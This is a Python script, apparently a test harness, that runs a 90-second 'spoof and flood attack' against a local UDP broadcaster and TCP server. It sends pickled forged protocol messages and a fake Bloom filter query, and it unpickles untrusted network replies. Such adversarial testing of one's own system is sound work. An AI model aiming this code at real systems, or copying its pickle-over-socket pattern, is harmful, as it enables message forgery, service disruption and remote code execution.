import socket
import random
import time
import pickle
import logging
import pybloom_live
import os
from typing import Tuple, Any

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Configuration
UDP_BROADCAST_PORT = 55050
TCP_SERVER_PORT = 55000  # Match this with the TCP server port
HOST = 'localhost'
ATTACK_DURATION = 90  # seconds

def send_spoof_message(sock: socket.socket, message: Tuple[Any, ...], target: Tuple[str, int]) -> None:
    try:
        sock.sendto(pickle.dumps(message), target)
        logging.info(f"Sent spoofed message: {message[0]} to {target}")
    except Exception as e:
        logging.error(f"Error sending spoofed message: {e}")

def main():
    with socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM) as attacker_socket:
        attacker_socket.bind((HOST, 8887))
        
        start_time = time.time()
        logging.info("Starting spoof and flood attack")
        
        while time.time() - start_time < ATTACK_DURATION:
            # Spoof receiving shares
            msg_tuple1 = ('receiverPG', 5, os.urandom(32))
            send_spoof_message(attacker_socket, msg_tuple1, (HOST, UDP_BROADCAST_PORT))
            
            # Spoof being a broadcaster
            msg_tuple2 = ('senderPub', os.urandom(32), UDP_BROADCAST_PORT)
            send_spoof_message(attacker_socket, msg_tuple2, (HOST, UDP_BROADCAST_PORT))
            
            # Add interaction with TCP server
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
                    tcp_socket.connect((HOST, TCP_SERVER_PORT))
                    spoof_bf = pybloom_live.BloomFilter(capacity=1000, error_rate=0.001)
                    spoof_bf.add(os.urandom(32))  # Add random data to spoof Bloom filter
                    tcp_socket.send(pickle.dumps(('QBF', spoof_bf)))
                    response = pickle.loads(tcp_socket.recv(1024))
                    logging.info(f"Received response from TCP server: {response}")
            except Exception as e:
                logging.error(f"Error interacting with TCP server: {e}")
            
            time.sleep(1)  # Avoid flooding too quickly

    logging.info("Attack completed")

if __name__ == "__main__":
    main()